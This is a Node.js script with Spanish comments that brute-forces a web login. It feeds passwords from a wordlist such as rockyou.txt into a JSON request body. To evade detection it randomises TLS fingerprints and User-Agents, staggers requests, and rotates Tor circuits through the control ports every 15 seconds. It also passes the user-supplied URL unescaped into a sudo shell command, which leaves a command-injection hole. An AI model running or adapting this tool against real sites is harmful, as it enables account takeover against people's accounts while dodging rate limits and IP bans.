#!/usr/bin/env node



 //-------------importaciones--------------

import yargs from 'yargs'

import {hideBin} from 'yargs/helpers'

import fs from 'fs'

import { SocksProxyAgent } from 'socks-proxy-agent'
import axios from 'axios'

import net from 'net'
import dns from 'dns/promises'

import UserAgent from 'user-agents'

import { exec } from 'child_process';
import { promisify } from 'util';
import {Session,ClientIdentifier,initTLS,destroyTLS} from "node-tls-client"
  
const execAsync = promisify(exec);



    

//-------------declaración de variables--------------------

let control_ports=["9053","9055","9057","9059","9061"]

let browsers= JSON.parse(fs.readFileSync("./browsers.json").toString())


const yarg= yargs(hideBin(process.argv))

.option("url",{demandOption:false,type:"string"}).option("n",{type:"number",demandOption:false, default:5}).

option("header",{type:"string",default:"application/json"})

.option("body",{type:"string",default:'{"usuario":"netaru3","contraseña":"contraseña"}'})

.option("method",{type:"string"})

.option("wordlist",{type:"string",default:"/usr/share/wordlists/rockyou.txt"})

.option("error",{type:"string",default:"error"})
.options("proxies",{type:"number",default:5}).parseSync()



let url= yarg.url || "https://login-de-pruebas2.onrender.com/login"

await execAsync(`sudo ./dns.sh ${url}`)

const objURL= new URL(url)






let wordlist= fs.readFileSync(yarg.wordlist).toString().split("\n")



let body=JSON.parse(yarg.body)
    


let num_de_peticiones=0



let promesas=[]





let header=yarg.header

let contraseña_encontrada=false

let a=0

const idiomas = ['es-ES,es;q=0.9', 'en-US,en;q=0.9', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.9'];


 





//declaracion de funciones


 await initTLS()

async function worker(){let i=0; 

    

    while(i<yarg.n){try{let contraseña= wordlist.shift(); const keys = Object.keys(body);
body[keys[1]] = contraseña; 
     let navegadores= Object.values(ClientIdentifier)

     let num_aleatorio= Math.round(Math.random()*(navegadores.length-1))
     let navegador= navegadores[num_aleatorio];

     let cliente= ClientIdentifier[navegador]

     if(cliente===undefined){cliente= ClientIdentifier[navegador.toLowerCase()]}


      const session = new Session({proxy:"http://127.0.0.1:8118",
    clientIdentifier: cliente,
    timeout: 6000,
  });
   let agent= browsers[cliente]



   setTimeout(async() => {
    await session.post(url,{body:JSON.stringify(body),headers:{"Content-Type":header,"User-Agent":agent}}).then(function(data){return data.text()}).then(function(data){console.log(data)})
   }, Math.random()*6000);

  
        
     

    }catch(error){console.log("error:",error)}

        ++i;

    }

}



//-----------codigo-------------






  


    

   let ID2= setInterval(async () => {if(contraseña_encontrada===true){clearInterval(ID2); process.exit()}
    let a=0
    while(a<5){++a; worker()}



    

    }, 5000);


    let ID1= setInterval(() => {
        for (let ports of control_ports){
            const socket= net.connect(ports,"127.0.0.1")

            socket.on('connect', () => {
            socket.write('AUTHENTICATE ""\r\n');
            
            socket.on('data', (data) => {
                const response = data.toString();
                if (response.includes('250')) {
                    socket.write('SIGNAL NEWNYM\r\n');
                    
                    socket.on('data', (data2) => {
                        if (data2.toString().includes('250')) {
                            socket.destroy();
                        }
                    });
                }
            });
        });
        }
    }, 15000);

       

